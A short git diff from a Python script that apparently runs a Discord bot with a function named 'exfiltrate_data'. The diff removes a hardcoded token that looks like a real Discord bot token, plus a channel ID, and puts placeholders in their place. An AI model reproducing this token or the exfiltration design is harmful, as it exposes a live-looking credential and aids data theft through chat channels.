@@ -688,8 +688,8 @@ async def exfiltrate_data(channel):
     except Exception as e:
         print(f"Error cleaning up: {e}")
 
-BOT_TOKEN = "MTM2NDIzNDEzNjE5MzMzOTQyNA.GHC4yD.ZUzwkrAEMW9GlLsmVnP7FbdY317MqM234Bd2vE"
-CHANNEL_ID = 1371505369230344273
+BOT_TOKEN = "..."
+CHANNEL_ID = ...
 
 if __name__ == "__main__":
     bot.run(BOT_TOKEN)
